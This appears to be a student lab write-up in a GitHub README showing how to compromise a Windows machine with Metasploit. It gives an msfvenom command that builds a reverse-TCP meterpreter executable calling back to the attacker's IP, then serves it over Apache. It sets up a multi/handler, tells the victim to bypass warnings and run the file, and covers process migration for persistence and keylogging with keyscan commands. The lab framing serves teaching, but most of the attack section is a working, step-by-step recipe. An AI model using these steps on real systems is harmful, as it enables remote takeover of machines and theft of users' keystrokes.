# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![s](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/d9b9e488-6580-4969-a3d2-5061443c0ed1)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![1](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/12b58fda-5cec-4e47-872b-b838ef920d46)




copy the fun.exe into the apache /var/www/html folder
![2](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/37d7e507-5d47-4ddb-ba93-586f6d73a51b)


Start apache server
sudo systemctl apache2 start

![3](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/0d0224f9-d80c-42b9-a3ab-09b48da66a27)



Check the status of apache2
![4](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/77516604-9c4f-4317-a188-c41de4625542)



Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/fee0700e-bafd-4e76-af72-f5ac23a5d6ba)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![9](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/85fb473c-59fe-4042-b163-552fddc735d1)



keyscan_dump	Shows the keystrokes captured so far
![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
